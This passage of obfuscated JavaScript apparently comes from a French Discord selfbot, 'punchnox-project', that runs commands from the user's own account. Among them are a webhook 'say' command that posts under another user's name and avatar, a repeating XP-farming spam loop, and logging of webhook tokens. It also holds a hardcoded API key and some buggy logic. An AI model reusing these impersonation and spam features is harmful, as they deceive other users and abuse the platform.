                        }
                        if (cg.content.startsWith(ab + 'empty')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              cg.delete(), cg.channel.send('͔');
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'backup-f')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let jF = [],
                                jG = aN.user.friends.array();
                              for (let jH = 0; jH < jG.length; jH++) {
                                jF.push(jG[jH].username + '#' + jG[jH].discriminator + '(' + jG[jH].id + ')');
                              }
                              aE(jF.join('\n')).then(jJ => {
                                var jK = new aw.RichEmbed().setTitle('***Votre liste d\'amis est disponible sur ce lien :*** \n' + jJ).setTimestamp().setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                                cg.edit(jK);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'farmexp')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              cg.edit('***farm xp en cours.***');
                              cg.edit('***farm xp en cours..***');
                              cg.edit('***farm xp en cours...***');
                              cg.delete();
                              var di = setInterval(function () {
                                cg.channel.send('farm xp punchnox-project');
                              }, 5000);
                              commandIntervals.push(di);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'stopfarmexp')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) commandIntervals.forEach(jN => {
                              clearInterval(jN);
                            }), cg.edit('***farm xp stoppé avec succès***');else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'listeguild')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var dj = aN.user.friends.size;
                              const jQ = aN.user.friends.array();
                              guilds = aN.guilds.array(), console.log(ay.hex(y)('Successfully backed up ' + guilds.length.toString().bold + ' servers.')), aE(guilds).then(jR => {
                                var jS = new aw.RichEmbed().setTitle('**liste guilds**').addField('```lien hastebins```', jR).setColor(ad).setTimestamp().setDescription(guilds);
                                cg.edit(jS);
                              });
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content === ab + 'punchnox') {
                          if (cg.author.id === aN.user.id) {
                            cg.edit('***punchnox le plus bo***');
                          }
                        }
                        if (cg.content === ab + 'rebeu') {
                          if (cg.author.id === aN.user.id) {
                            cg.edit('***rebeudeter bien ou bien ?***');
                          }
                        }
                        if (cg.content.startsWith(ab + 'setprefix')) {
                          if (cg.author.id === aN.user.id) {
                            var dn = cg.content.split(' ').slice(1).join(' ');
                            if (!dn[0]) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', 'un argument est nécessaire'));
                            ab = dn;
                            var dm;
                            dm = new aw.RichEmbed().setTitle('prefix changé en: ' + dn);
                            cg.delete();
                            cg.channel.send(dm);
                          }
                        }
                        if (cg.content === ab + 'emojirandom') {
                          if (cg.author.id === aN.user.id) {
                            function jV() {
                              var jW = ['☺', '😊', '😀', '😁', '😂', '😃', '😄', '😅', '😆', '😇', '😈', '😉', '😯', '😐', '😑', '😕', '😠', '😬', '😡', '😢', '😴', '😮', '😣', '😥', '😦', '😧', '😨', '😩', '😰', '😟', '😱', '😲', '😳', '😵', '😶', '😷', '😞', '😒', '😍', '😛', '😜', '😝', '😋', '😗', '😙', '😘', '😚', '😎', '😭', '😌', '😖', '😔', '😪', '😏', '😓', '😫', '🙋', '🙌', '🙍', '🙅', '🙆', '🙇', '🙎', '🙏', '😺', '😼', '😸', '😹', '😻', '😽', '😿', '😾', '🙀', '🙈', '🙉', '🙊', '👶', '👦', '👧', '👨', '👩', '👴', '👵', '👮', '👷', '💁', '💂', '👯', '👰', '👸', '🎅', '👼', '👱', '👲', '👳', '💆', '👻', '👹', '👺', '💀', '👽', '👾', '👿', '💇', '👀'];
                              return jW[Math.floor(Math.random() * jW.length)];
                            }
                            cg.edit(jV()).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV())).then(cg.edit(jV()));
                          }
                        }
                        if (cg.content.startsWith(ab + 'retourne')) {
                          if (cg.author.id === aN.user.id) {
                            const jX = '¡"#$%⅋,)(*+\'-˙/0ƖᄅƐㄣϛ9ㄥ86:;<=>?@∀qƆpƎℲפHIſʞ˥WNOԀQɹS┴∩ΛMX⅄Z[/]^_`ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz{|}~',
                              jY = '!'.charCodeAt(0),
                              jZ = cg.content.split(' ').slice(1);
                            if (!jZ[0]) return cg.edit('il me faut un argument');
                            cg.delete(), cg.channel.send(jZ.join(' ').split('').map(k0 => k0.charCodeAt(0) - jY).map(k0 => jX[k0] || ' ').reverse().join(''));
                          }
                        }
                        if (cg.content === ab + 'delimage') {
                          if (cg.author.id === aN.user.id) {
                            bm = '', cg.delete();
                            var cq = new aw.RichEmbed().setTitle('***l\'image de l\'embed a été supprimé***').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'setimage')) {
                          if (cg.author.id === aN.user.id) {
                            const k2 = cg.content.split(' ').slice(1).join(' ');
                            if (!k2[0]) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', 'un argument est nécessaire'));
                            cg.delete();
                            var cq = new aw.RichEmbed().setTitle('***l\'image de l\'embed a été remplacé par :***').setColor(ad).setImage(k2).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq), bm = k2;
                          }
                        }
                        if (cg.content.startsWith(ab + 'block')) {
                          if (cg.author.id === aN.user.id) {
                            var dp = cg.mentions.user.first();
                            if (!dp) return cg.edit('Mentionne quelqu\'un a bloqué');
                            dp.block(), cg.edit('L\'utilisateur <@' + dp.id + '> a bien été bloqué');
                          }
                        }
                        if (cg.content.startsWith(ab + 'settwitch')) {
                          if (cg.author.id === aN.user.id) {
                            const k5 = cg.content.split(' ').slice(1).join(' ');
                            if (!bm[0]) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', 'un argument est nécessaire'));
                            cg.delete();
                            var cq = new aw.RichEmbed().setTitle('***le lien twitch à bien été changé en :*** ' + k5).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq), ae = k5;
                          }
                        }
                        if (cg.content.startsWith(ab + 'setcolor')) {
                          if (cg.author.id === aN.user.id) {
                            const k6 = cg.content.split(' ').slice(1).join(' ');
                            if (!k6[0]) return cg.delete().then(console.log('[', ay.hex(u)('ERROR'), ']', 'un argument est nécessaire'));
                            cg.delete();
                            var cq = new aw.RichEmbed().setTitle('***la couleur à bien été changé en :*** ' + k6).setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq), ad = k6;
                          }
                        }
                        if (cg.content === ab + 'sendnude') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('').setColor(ad).setImage('https://cdn.discordapp.com/attachments/568447335152091136/568549335747264512/Ok_Send___1.jpg');
                            cg.edit(cq);
                          }
                        }
                        if (cg.content === ab + 'sendnude') {
                          if (cg.author.id === aN.user.id) {
                            var dq = () => '10000000-1000-4000-8000-100000000000'.replace(/[018]/g, ka => (ka ^ Math.random() * 16 >> ka / 4).toString(16));
                            aF.getRpcImage('713451199730548837', 'sendnude').then(ka => {
                              let kb = new aF.Rpc().setName('glisse ton 🍑 en dm stp :)').setUrl(ae).setType('PLAYING').setApplicationId('713451199730548837').setAssetsLargeImage(ka.id).setAssetsLargeText('glisse ton 🍑 en dm stp :)').setState('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩');
                              aN.user.setPresence(kb.toDiscord());
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'antiraidon')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              if (!cg.member.hasPermission('ADMINISTRATOR')) return cg.channel.send('Vous n\'avez pas la permission');
                              if (!aN.lockit) aN.lockit = [];
                              let kb = ['release', 'unlock'];
                              if (kb.includes()) {
                                cg.guild.channels.forEach(async (kc, kd) => {
                                  var kg = {};
                                  kg.SEND_MESSAGES = null, kg.SPEAK = null, await kc.overwritePermissions(cg.guild.id, kg);
                                });
                              } else cg.guild.channels.forEach(async (kd, ke) => {
                                var kf = {};
                                kf.SEND_MESSAGES = false, kf.SPEAK = false, await kd.overwritePermissions(cg.guild.id, kf);
                              });
                              var dr = new aw.RichEmbed().setTitle('**L\'anti raid est activé**').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(dr);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'antiraidoff')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              if (!cg.member.hasPermission('ADMINISTRATOR')) return cg.channel.send('Vous n\'avez pas la permission');
                              if (!aN.lockit) aN.lockit = [];
                              let ke = ['release', 'unlock'];
                              ke.includes() ? cg.guild.channels.forEach(async (kf, kg) => {
                                var kh = {};
                                kh.SEND_MESSAGES = null, kh.SPEAK = null, await kf.overwritePermissions(cg.guild.id, kh);
                              }) : cg.guild.channels.forEach(async (kf, kg) => {
                                var kh = {};
                                kh.SEND_MESSAGES = null, kh.SPEAK = null, await kf.overwritePermissions(cg.guild.id, kh);
                              });
                              var ds = new aw.RichEmbed().setTitle('**L\'anti raid est désactivé**').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(ds);
                            } else cg.edit(cu);
                          }
                        }
                        if (cg.content.startsWith(ab + 'say')) {
                          if (cg.author.id === aN.user.id) {
                            let kg = cg.guild;
                            if (!kg) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            let kh = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              ki = kh.displayAvatarURL;
                            var cN = cg.content.split(' '),
                              dt = cN.slice(2);
                            cg.delete();
                            let kj = dt.join(' ');
                            cg.channel.createWebhook(kh.username, ki).then(kk => {
                              const kl = new aw.WebhookClient(kk.id, kk.token);
                              kl.send(kj), kl.delete();
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'createwebhook')) {
                          if (cg.author.id === aN.user.id) {
                            let kk = cg.guild;
                            if (!kk) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            let kl = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              km = kl.displayAvatarURL;
                            var cN = cg.content.split(' '),
                              dt = cN.slice(2);
                            cg.delete();
                            let kn = dt.join(' ');
                            cg.channel.createWebhook('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 (Webhook)', km).then(ko => {
                              const ks = new aw.WebhookClient(ko.id, ko.token);
                              var kr = new aw.RichEmbed().setTitle('**Webhook créé avec succès**').setDescription('***Le token du Webhook:***\n ' + ko.token + ' \n***L\'id du Webhook:***\n ' + ko.id).setColor(ad).setThumbnail(km).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              console.log(ay.hex(w)('Webhook \nServeur: ' + cg.guild.name + ' \nChannel: ' + cg.channel.name + ' \nId hannel: ' + cg.channel.id + ' \nWebhook créer: ' + cg.createdAt + ' \nid: ' + ko.id + ' \nToken: ' + ko.token)), ks.send(kr);
                            }).catch(console.error);
                          }
                        }
                        if (cg.content.startsWith(ab + 'delwebhook')) {
                          if (cg.author.id === aN.user.id) {
                            let kq = cg.guild;
                            if (!kq) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0);
                            cg.delete();
                            const kr = new aw.WebhookClient(dt[1], dt[2]);
                            kr.delete();
                            var du = new aw.RichEmbed().setTitle('**Webhook supprimé avec succès**').setDescription('***Le token du Webhook:***\n ' + dt[2] + ' \n\n***L\'id du Webhook:***\n ' + dt[1]).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            console.log(ay.hex(w)('Webhook \nServeur: ' + cg.guild.name + ' \nChannel: ' + cg.channel.name + ' \nId hannel: ' + cg.channel.id + ' \nWebhook supprimé: ' + cg.createdAt + ' \nid: ' + dt[1] + ' \nToken: ' + dt[2])), cg.channel.send(du).catch(console.error);
                          }
                        }
                        if (cg.content === ab + 'multistream') {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              setInterval(function () {
                                aN.user.setActivity(af[Math.floor(Math.random() * af.length)], {
                                  'type': 'STREAMING',
                                  'url': ae
                                });
                              }, 5000);
                              var cq = new aw.RichEmbed().setTitle('***multistream en cours***').setTimestamp().setColor(ad);
                              cg.edit(cq);
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'orange')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' '),
                              dv = {};
                            dv.code = 'fix', cg.edit(d8, dv);
                          }
                        }
                        if (cg.content.startsWith(ab + 'green')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' '),
                              dw = {};
                            dw.code = 'css', cg.edit(d8, dw);
                          }
                        }
                        if (cg.content.startsWith(ab + 'cyane')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' '),
                              dx = {};
                            dx.code = 'diff', cg.edit('#' + d8, dx);
                          }
                        }
                        if (cg.content.startsWith(ab + 'red')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' ');
                            cg.edit('-' + d8, {
                              'code': 'diff'
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'cache')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' ');
                            cg.edit('||' + d8 + '||');
                          }
                        }
                        if (cg.content.startsWith(ab + 'yellow')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' '),
                              dy = {};
                            dy.code = 'fix', cg.edit(d8, dy);
                          }
                        }
                        if (cg.content.startsWith(ab + 'gris')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' '),
                              dz = {};
                            dz.code = 'py', cg.edit(d8, dz);
                          }
                        }
                        if (cg.content.startsWith(ab + 'surli')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' ');
                            cg.edit('$' + d8, {
                              'code': 'tex'
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'gras')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' ');
                            cg.edit('**' + d8 + '**');
                          }
                        }
                        if (cg.content.startsWith(ab + 'souli')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' ');
                            cg.edit('__' + d8 + '__');
                          }
                        }
                        if (cg.content.startsWith(ab + 'barre')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' ');
                            cg.edit('~~' + d8 + '~~');
                          }
                        }
                        if (cg.content.startsWith(ab + 'ita')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              d8 = dt.slice(1).join(' ');
                            cg.edit('_' + d8 + '_');
                          }
                        }
                        if (cg.content.startsWith(ab + 'reverse')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(1);
                            const kF = d8.join(' '),
                              kG = kF.split('').reverse().join('');
                            cg.edit('᠎' + kG);
                          }
                        }
                        if (cg.content.startsWith(ab + 'mac')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(1);
                            aD.get('http://api.macvendors.com/' + d8).then(kJ => {
                              var kK = kJ.text,
                                kL = new aw.RichEmbed().setTitle('MAC Lookup Result').setDescription(kK).setColor(ad).setThumbnail('https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.edit(kL);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'minesweeper')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(1);
                            const kL = parseInt(d8[0]) <= 10 ? parseInt(d8[0]) : 10,
                              kM = parseInt(d8[1]) <= 10 ? parseInt(d8[1]) : 10,
                              kN = parseInt(d8[2]) > parseInt(kL * kM / 4) ? parseInt(kL * kM / 4) : parseInt(d8[2]);
                            var dA = {};
                            dA.rows = kL, dA.columns = kM, dA.mines = kN;
                            const kO = new aM(dA).start(),
                              kP = new aw.RichEmbed();
                            kP.setAuthor('• Game started by ' + cg.author.username, '' + cg.author.displayAvatarURL).setDescription(kO + '\n**Rows:** ' + kL + ' | **Columns:** ' + kM + ' | **Mines:** ' + kN).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL), cg.channel.send(kP);
                          }
                        }
                        if (cg.content.startsWith(ab + 'dé')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(0),
                              dB = dt.slice(1).join(' ');
                            if (!dB) {
                              cg.edit(':x: Vous n\'avez pas mentionné un nombre ! Exemple/Usage : `' + ab + 'dé 5`');
                              return;
                            }
                            let kQ = ['1', '2', '3', '4', '5', '6'],
                              kR = Math.floor(Math.random() * kQ.length);
                            var dC = new aw.RichEmbed().setAuthor('🎲 | Vaction | dé').setColor(ad).addField('Votre pari', dB).addField('Nombre gagnant', kQ[kR]).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(dC), console.log('Commande ' + ab + 'dé demandé !');
                          }
                        }
                        if (cg.content === ab + 'fish') {
                          if (cg.author.id === aN.user.id) {
                            let kS = ['🦑', '🦐', '🦀', '🐚', '🐙', '🦈', '🐡', '🐠', '🐟', '🐬', '🐋', '🐳', '🐢'],
                              kT = Math.floor(Math.random() * kS.length);
                            var dC = new aw.RichEmbed().setAuthor('🐋 | Vaction | Pêche').setColor(ad).addField('Tu as pêché', kS[kT]).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(dC), console.log('Commande fish demandé !');
                          }
                        }
                        if (cg.content.startsWith(ab + 'report')) {
                          if (cg.author.id === aN.user.id) {
                            var dG = cg.content.split(' ').slice(1).join(' ');
                            if (!dG) return cg.edit('**:x: il manque des arguments**');
                            var cq = new aw.RichEmbed().setTitle('**⛔ Report de beugs**').setDescription('\n  -Votre demande a bien été ressus\n  -Beugs trouvé : ' + dG + '\n  \n  *⚠️Si vous faites des demandes /fake/troll/ou spam de demande, vous serez blacklist\nPas besoin de donner votre pseudo,id... nous la recevons automatiquement.*').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq).catch(kW => cg.edit('**:x: Votre demande n\'a pas pu être envoilé aux serveurs du selfbot**'));
                            var dF = {};
                            dF.Commande = 'report', dF.Report_par = cg.author.username + '#' + cg.author.discriminator, dF.User_id = aN.user.id, dF.Reason = dG, dF.Date_report = ax().format('MM/DD/YYYY 𝙖 HH:ss'), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/report').send(dF).end((kW, kX) => {
                              if (kW) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'blacklist')) {
                          if (cg.author.id === aN.user.id) {
                            var dG = cg.content.split(' ').slice(1).join(' ');
                            if (!dG) return cg.edit('**:x: il manque des arguments**');
                            var cq = new aw.RichEmbed().setTitle('**⛔ Demande de blacklist**').setDescription('\n  -Votre demande a bien été ressus\n  -Raisons de la demande : ' + dG + '\n  \n  *⚠️Si vous faites des demandes inutiles/fake/troll/ou spam de demande, vous serez blacklist*').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq).catch(kX => cg.edit('**:x: Votre demande n\'a pas pu être envoilé aux serveurs du selfbot**')), aD.post('https://punchnox-project-api.herokuapp.com/api/logs/black').send({
                              'Commande': 'blacklist',
                              'Report_par': cg.author.username + '#' + cg.author.discriminator,
                              'User_id': aN.user.id,
                              'Reason': dG,
                              'Date_demande': ax().format('MM/DD/YYYY 𝙖 HH: ss')
                            }).end((kX, kY) => {
                              if (kX) return console.log('[31mErreur lors de la connexion aux serveurs du punchnox-project[0m');
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'chatbot')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              var cN = cg.content.split(' '),
                                dt = cN.slice(1);
                              let kX = dt.slice(0).join(' ');
                              aD.get('https://some-random-api.ml/chatbot?message=' + kX).then(kY => {
                                var kZ = kY.body.response,
                                  l0 = new aw.RichEmbed().setTitle('CHAT BOT').setDescription(kZ).setColor(ad);
                                cg.channel.send(l0);
                              });
                            } else {
                              cg.edit(cu);
                            }
                          }
                        }
                        if (cg.content.startsWith(ab + 'fortnite')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            var cN = cg.content.split(' '),
                              d8 = cN.slice(0);
                            let l1 = d8.slice(1).join(' ');
                            l1 = l1.trim();
                            if (l1 === '' || l1.indexOf(':') > -1 || !l0(l1)) {
                              var dH = aN.emojis.find('name', 'aaa');
                              if (dH === null) dH = ':(';
                              cg.channel.send('Illegal argument ' + dH);
                              return;
                            }
                            var dI = '30d9b361-de82-4601-a8de-a001b5b94c61',
                              dJ = {};
                            dJ['TRN-Api-Key'] = dI;
                            var dK = {};
                            dK.host = 'api.fortnitetracker.com', dK.path = '/v1/profile/pc/' + encodeURIComponent(l1), dK.port = 0x1bb, dK.method = 'GET', dK.headers = dJ;
                            var dL = dK,
                              dM = https.request(dL, function (l3) {
                                var l4 = '';
                                l3.on('data', function (l5) {
                                  l4 += l5;
                                }), l3.on('end', l5 => {
                                  l4 = JSON.parse(l4), console.log(l4);
                                  if (l4.error) {
                                    var l6 = aN.emojis.find('name', 'feelsbadman');
                                    if (l6 === null) l6 = ':(';
                                    cg.channel.send('Player not found ' + l6);
                                    return;
                                  }
                                  var l7 = l4.epicUserHandle,
                                    l8 = l4.platformName,
                                    l9 = l4.lifeTimeStats[6].value,
                                    la = l4.lifeTimeStats[7].value,
                                    lb = l4.lifeTimeStats[8].value,
                                    lc = l4.lifeTimeStats[9].value,
                                    ld = l4.lifeTimeStats[10].value,
                                    le = l4.lifeTimeStats[11].value,
                                    lf = 'https://fortnitetracker.com/profile/pc/' + encodeURIComponent(l1),
                                    lg = '';
                                  lg += '\nwins: ' + lb, lg += '\ngames: ' + la, lg += '\nwinrate: ' + lc, lg += '\n\nkills: ' + ld, lg += '\nkd: ' + le;
                                  var lh = new aw.RichEmbed().setAuthor(l7, '', lf).setDescription(lg).setColor(ad).setURL(lf).setThumbnail('https://cdn2.unrealengine.com/Fortnite%2Fhome%2Ffn_battle_logo-1159x974-8edd8b02d505b78febe3baacec47a83c2d5215ce.png');
                                  cg.channel.send(lh);
                                });
                              });
                            dM.end();
                          }
                          ;
                          function l0(l3) {
                            return !/[~`!#$%\^&*+=\[\]\\';,/{}|\\":<>\?]/g.test(l3);
                          }
                        }
                        const dN = ['https://cdn.discordapp.com/attachments/718445465988890634/718865788882124871/vWyY7uCbitZRkOj8ZF6YmYlHhAtBAwPlT0WIgkW2HNUkHJn28uy6BUZJSlp7BeNUDM2vAni6oxV9dgxHW854P-xRnHwViSJiXMTh.png', 'https://cdn.discordapp.com/attachments/718445465988890634/718865959904870430/Rl8Ll0h-ygfVxFRDTZTKoWo3qYMElLsb6CXHpR5RAKnkZM7U5FzSop96mbGGvBRcxyApGGVtpewxEPFESeN1UKBWZtyhbIcjV1g_.png', 'https://cdn.discordapp.com/attachments/718445465988890634/718866472897740830/images.png'];
                        var dO = dN[Math.floor(Math.random() * dN.length)];
                        if (cg.content === ab + 'pecho') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('').setImage(dO).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content === ab + 'calme') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('Calme').setImage('https://media.discordapp.net/attachments/714904917705228299/718869109172862986/Notreallynecessarybeforetheendofww2wehad_f124e78f01737a2589acb4da61f7806b.png').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        const dP = ['♣', '♥', '♦', '♠'],
                          dQ = ['Jack', 'Queen', 'King', 'Ace', 'Joker', '2', '3', '4', '5', '6', '7', '8', '9', '10'];
                        var dR = dQ[Math.floor(Math.random() * dQ.length)],
                          dS = dP[Math.floor(Math.random() * dP.length)];
                        if (cg.content === ab + 'randomcard') {
                          if (cg.author.id === aN.user.id) {
                            var cq = new aw.RichEmbed().setTitle('***RANDOM CARTE***').setDescription('**je choisis : **\n' + dR + dS).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        if (cg.content === ab + 'russianroulette') {
                          if (cg.author.id === aN.user.id) {
                            var dT = ~~(Math.random() * 3);
                            console.log('--> Rolled ' + dT + ' in russian roulette');
                            var dU = '<:dizzy_face:418874338138128395>    <:boom:418874561006927881> <:gun:418869220932190228> UNLUCKY',
                              dV = '<:sweat_smile:418874817719304215>           <:gun:418869220932190228> LUCKY',
                              dW = '<:smile:418868020623179797>            <:gun:418869220932190228>';
                            cg.channel.send(dW + '   3').then(l4 => {
                              setTimeout(function () {
                                l4.edit(dW + '   2').then(la => {
                                  setTimeout(function () {
                                    la.edit(dW + '   1').then(lf => {
                                      setTimeout(function () {
                                        if (dT == 0) {
                                          lf.edit(dU);
                                        } else {
                                          lf.edit(dV);
                                        }
                                      }, 1000);
                                    });
                                  }, 1000);
                                });
                              }, 1000);
                            });
                          }
                        }
                        if (cg.content.startsWith(ab + 'opinion')) {
                          if (cg.author.id === aN.user.id) {
                            var cN = cg.content.split(' '),
                              dt = cN.slice(1);
                            let l5 = dt.slice(0).join(' ');
                            const l6 = ['👍', '👎'];
                            var dX = l6[Math.floor(Math.random() * l6.length)],
                              cq = new aw.RichEmbed().setTitle('***OPINION***').setDescription(l5 + '\n**je choisis : **\n ' + dX).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.edit(cq);
                          }
                        }
                        var dY = ['pile', 'face'];
                        if (cg.content === ab + 'pf') {
                          cg.author.id === aN.user.id && (cg.edit('***Je lance la piece.***'), cg.edit('***Je lance la piece..***'), cg.edit('***Je lance la piece...***'), cg.edit('***Je choisis : ' + dY[Math.floor(Math.random() * dY.length)] + '***'));
                        }
                        var dZ = Math.floor(Math.random() * 2);
                        if (cg.content === ab + 'corona') {
                          if (cg.author.id === aN.user.id) {
                            cg.edit('***Je check si tu es infecté.***'), cg.edit('***Je check si tu es infecté..***'), cg.edit('***Je check si tu es infecté...***');
                          }
                        }
                        if (cg.content === ab + 'corona') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete().catch(console.error());
                            var dZ = Math.floor(Math.random() * 2);
                            cg.channel.send('*Avez vous une chance de survivre au coronavirus ?*'), lb();
                            function lb() {
                              setTimeout(lc, 5000);
                            }
                            function lc() {
                              if (dZ = 2) {
                                le();
                              } else {
                                if (dZ = 1) {
                                  ld();
                                }
                              }
                            }
                            function ld() {
                              var lf = new aw.RichEmbed().setTitle('**Survivant Ou Infecté ?**').addField('*Infecté :*', '*Oui, malheureusement tu a été infécté :(*').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                              cg.channel.send(lf).catch(console.error).then(lg => lg.delete(time));
                            }
                            function le() {
                              var lf = new aw.RichEmbed().setTitle('**Survivant Ou Infecté ?**').addField('*Infecté :*', '*Nop, tu n\'a pas été infecté, tu a survécu :)*').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                              cg.channel.send(lf).catch(console.error).then(lg => lg.delete(time));
                            }
                          }
                        }
                        cg.content === ab + 'name' && cg.author.id === aN.user.id && (cg.delete(), cg.channel.send('' + aP.name()));
                        if (cg.content === ab + 'gtwitter') {
                          if (cg.author.id === aN.user.id) {
